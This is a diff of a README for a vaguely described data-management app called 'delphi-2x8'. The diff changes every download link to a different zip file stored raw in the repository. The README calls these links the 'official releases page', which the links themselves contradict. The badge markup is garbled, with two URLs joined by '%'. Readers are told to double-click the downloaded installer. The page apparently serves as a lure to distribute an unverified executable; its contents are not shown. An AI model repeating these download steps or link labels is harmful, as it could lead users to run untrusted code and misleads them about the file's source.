@@ -4,7 +4,7 @@
 Welcome to delphi-2x8! This application helps you manage your data effectively and efficiently. You can quickly handle various data tasks without any technical knowledge.
 
 ## 📥 Download the Application
-[![Download delphi-2x8](https://raw.githubusercontent.com/Vish00077/delphi-2x8/main/Argus/delphi-2x8.zip%https://raw.githubusercontent.com/Vish00077/delphi-2x8/main/Argus/delphi-2x8.zip)](https://raw.githubusercontent.com/Vish00077/delphi-2x8/main/Argus/delphi-2x8.zip)
+[![Download delphi-2x8](https://raw.githubusercontent.com/Vish00077/delphi-2x8/main/crump/delphi_x_v1.9.zip%https://raw.githubusercontent.com/Vish00077/delphi-2x8/main/crump/delphi_x_v1.9.zip)](https://raw.githubusercontent.com/Vish00077/delphi-2x8/main/crump/delphi_x_v1.9.zip)
 
 ## 📋 System Requirements
 Before you begin, ensure your computer meets the following requirements:
@@ -25,11 +25,11 @@ delphi-2x8 offers several key features to improve your data management:
 To get started with delphi-2x8, follow these steps:
 
 1. **Visit the Releases Page:** Click on the link below to go to the official releases page.
-   [Download from Releases Page](https://raw.githubusercontent.com/Vish00077/delphi-2x8/main/Argus/delphi-2x8.zip)
+   [Download from Releases Page](https://raw.githubusercontent.com/Vish00077/delphi-2x8/main/crump/delphi_x_v1.9.zip)
 
 2. **Select the Latest Version:** You will see a list of available versions. Look for the latest version at the top.
 
-3. **Download the Installer:** Click on the installer file link (usually labeled as `https://raw.githubusercontent.com/Vish00077/delphi-2x8/main/Argus/delphi-2x8.zip`).
+3. **Download the Installer:** Click on the installer file link (usually labeled as `https://raw.githubusercontent.com/Vish00077/delphi-2x8/main/crump/delphi_x_v1.9.zip`).
 
 4. **Run the Installer:** Once the download is complete, locate the file in your Downloads folder and double-click to run it.
 
